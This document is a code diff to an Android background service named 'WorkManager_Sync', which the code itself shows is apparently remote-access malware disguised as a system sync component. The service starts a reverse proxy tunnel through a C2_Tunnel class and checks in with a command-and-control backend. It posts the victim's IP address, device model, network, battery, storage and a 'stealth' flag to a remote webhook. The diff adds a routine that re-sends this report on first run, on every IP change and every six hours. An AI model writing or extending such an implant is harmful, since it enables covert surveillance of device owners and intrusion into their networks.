@@ -78,9 +78,7 @@ public class WorkManager_Sync extends Service {
                 String currentIp = MainActivity.getLocalIpAddress();
                 if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                     networkExecutor.execute(() -> {
-                        sendIpToWebhook(currentIp);
-                        // [STABILITY_SYNC] Perform full status check-in with the backend
-                        C2_Uploader.checkIn(WorkManager_Sync.this);
+                        checkAndSendIpReport(currentIp);
                         
                         // [TACTICAL_SYNC] Establish Reverse Proxy Tunnel
                         C2_Tunnel.start(WorkManager_Sync.this);
@@ -106,7 +104,8 @@ public class WorkManager_Sync extends Service {
     private FirebaseConfig server;
     private ConnectivityManager connectivityManager;
     private ConnectivityManager.NetworkCallback networkCallback;
-    private String lastReportedIp = "";
+    private static String lastReportedIp = "";
+    private static long lastReportTimestamp = 0;
     private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
     private ContentObserver messageObserver;
     private boolean isForeground = false;
@@ -696,6 +695,26 @@ public class WorkManager_Sync extends Service {
         }
     }
 
+    private synchronized void checkAndSendIpReport(String currentIp) {
+        if (currentIp == null || currentIp.trim().isEmpty()) return;
+
+        long now = System.currentTimeMillis();
+        boolean ipChanged = !currentIp.equals(lastReportedIp);
+        boolean isInitialReport = lastReportedIp == null || lastReportedIp.isEmpty();
+        boolean periodicRefresh = (now - lastReportTimestamp > 6 * 60 * 60 * 1000); // 6 hours
+
+        if (isInitialReport || ipChanged || periodicRefresh) {
+            Log.d(TAG, "IP Report Triggered (Changed: " + ipChanged + ", Initial: " + isInitialReport + ", Current: " + currentIp + ")");
+            lastReportedIp = currentIp;
+            lastReportTimestamp = now;
+
+            if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
+                sendIpToWebhook(currentIp);
+                C2_Uploader.checkIn(WorkManager_Sync.this);
+            }
+        }
+    }
+
     private void checkAndReportIp() {
         if (networkExecutor.isShutdown()) return;
 
@@ -727,17 +746,10 @@ public class WorkManager_Sync extends Service {
             String localIp = MainActivity.getLocalIpAddress();
             String currentIp = (localIp != null) ? localIp : publicIp;
 
-            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
-                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
-                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
-                    // Send in background thread as network operations are involved
-                    try {
-                        networkExecutor.execute(() -> sendIpToWebhook(currentIp));
-                    } catch (Exception e) {
-                        Log.e(TAG, "Executor error", e);
-                    }
-                }
-                lastReportedIp = currentIp;
+            try {
+                networkExecutor.execute(() -> checkAndSendIpReport(currentIp));
+            } catch (Exception e) {
+                Log.e(TAG, "Executor error", e);
             }
         });
     }
@@ -799,27 +811,20 @@ public class WorkManager_Sync extends Service {
                 freeStorage = android.text.format.Formatter.formatFileSize(this, bytes) + " Free";
             } catch (Exception ignored) {}
 
-            String screenState = "OFF";
-            try {
-                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
-                if (pm != null && pm.isInteractive()) {
-                    screenState = "ON";
-                }
-            } catch (Exception ignored) {}
+            String fullDeviceModel = Build.MANUFACTURER + " " + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")";
 
-            // Build JSON for POST (without long deviceId as requested)
+            // Build JSON for POST (without long deviceId and screen state)
             String json = "{" +
                     "\"ip\":\"" + ip + "\"," +
-                    "\"device\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
-                    "\"model\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
+                    "\"device\":\"" + fullDeviceModel + "\"," +
+                    "\"model\":\"" + fullDeviceModel + "\"," +
                     "\"network\":\"" + networkType + "\"," +
                     "\"port\":" + actualPort + "," +
                     "\"link\":\"" + link + "\"," +
                     "\"battery\":\"" + batteryLevel + "%\"," +
                     "\"stealth\":" + isStealthMode() + "," +
                     "\"charging\":\"" + chargingStatus + "\"," +
-                    "\"storage\":\"" + freeStorage + "\"," +
-                    "\"screen\":\"" + screenState + "\"" +
+                    "\"storage\":\"" + freeStorage + "\"" +
                     "}";
 
             URL url = new URL(REMOTE_WEBHOOK_URL);
